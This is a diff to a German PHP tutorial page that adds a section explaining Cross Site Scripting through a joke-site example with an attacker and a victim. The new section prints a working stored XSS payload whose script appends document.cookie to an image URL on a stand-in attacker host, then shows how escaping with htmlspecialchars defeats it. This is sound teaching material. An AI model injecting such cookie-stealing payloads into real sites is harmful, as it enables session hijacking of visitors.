@@ -140,8 +140,49 @@ Damit funktioniert nun die Darstellung des Datensatzes richtig:
 
 
 
-Siehe auch
+Cross Site Scripting
 ----------
+
+Wenn das Escaping auf einer Webseite fehlt kann das auch für eine Attacke
+ausgenutzt werden, man nennt das "Cross Site Scripting".  Bei dieser Attacke
+braucht mein drei Personen:
+
+* Anna betreibt eine Webseite für Witze, jeder kann dort einen Witz hochladen
+* Eve hat einen Witz mit zusätzlichem Code hinterlassen - sie ist die Angreiferin
+* Bernhard kommt vorbei und liest Witze - er ist das Opfer
+
+So könnte der "Witz" aussehen, den Eve eingibt:
+
+<htmlcode>
+JavaScript ist doof!
+<img src="http://eve.net/bild.php" alt="harmlos" id="hack_tool" />
+<script>
+document.getElementById("hack_tool").src += "?c=" + document.cookie;
+</script>
+</htmlcode>
+
+Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:
+
+<htmlcode>
+JavaScript ist doof!
+<img id="hack_tool" alt="harmloses bild"
+src="http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115"/>
+</htmlcode>
+
+Wenn nun Bernhard diesen Witz liest, dann wird sein Cookie an den Server von Eve gesendet.
+
+Hätte Anna `htmlspecialchars` bei der Ausgabe verwendet, so wäre das Bild nie als
+Bild angezeigt worden, sondern als
+
+<htmlcode>
+JavaScript ist doof!
+&lt;img id=&quot;hack_tool&quot; alt=&quot;harmloses bild&quot;
+src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&quot;/&gt;
+</htmlcode>
+
+Escaping ist also ein wichtige Maßnahme gegen Cross Site Scripting.
+
+
 
 * Kapitel über [Cross Site Scripting (XSS)](/security/a3-injection/#slide-7)
 
